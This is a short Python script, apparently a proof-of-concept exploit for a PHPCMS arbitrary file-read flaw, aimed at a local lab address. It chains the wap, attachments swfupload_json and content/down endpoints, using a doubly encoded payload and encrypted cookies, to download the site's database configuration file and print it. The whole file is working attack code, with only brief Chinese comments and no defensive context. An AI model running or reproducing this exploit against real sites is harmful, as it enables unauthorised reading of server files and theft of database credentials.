#coding:utf-8
import requests
import re
url = 'http://192.168.42.133/phpcms/install_package/index.php'
s = requests.session()
params_get_userid = {
    'm':'wap',
    'c':'index',
    'siteid':'1',
}
rep = s.get(url,params=params_get_userid)
for cookie in rep.cookies:
    if '_siteid' in cookie.name:
        userid = cookie.value #userid为第一次加密的$this->userid
payload = '%26id%3D1%26m%3D1%26f%3Dcaches%2fconfigs%2fdatabase.ph%253C%26modelid%3D1%26catid%3D1%26s%3D%26i%3D1%26d%3D1%26' 
url_get_encode = '{}?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}'.format(url,payload)
data = {'userid_flash':userid}
rep = s.post(url_get_encode,data=data)
for cookie in rep.cookies:
    if '_att_json' in cookie.name:
        encode_payload = cookie.value
    
params = {
    'm':'content',
    'c':'down',
    'a_k':encode_payload,
}
rep = s.get(url,params=params)
content = rep.content#此时已经有下载链接了
file = re.findall(r'<a href="(.+?)"',content)[0]
print s.get(url+file).content
